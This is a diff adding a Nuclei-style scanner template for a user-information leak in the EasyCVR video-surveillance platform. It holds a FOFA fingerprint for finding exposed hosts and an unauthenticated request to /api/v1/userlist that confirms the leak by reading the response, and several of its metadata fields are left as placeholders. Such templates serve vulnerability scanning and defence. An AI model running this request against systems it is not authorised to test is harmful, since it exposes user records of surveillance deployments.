@@ -1,0 +1,31 @@
+id: EasyCVR-InformationLeakage
+
+info:
+  name: 视频监控汇聚平台EasyCVR用户信息泄漏漏洞
+  author: candada
+  severity: high
+  description: description
+  reference:
+    - https://
+  metadata: 
+    fofa-query: icon_hash="458134656"
+  tags: tags
+
+http:
+  - raw:
+      - |+
+        GET /api/v1/userlist?pageindex=0&pagesize=10 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"count"'
+      - type: status
+        status:
+          - 200
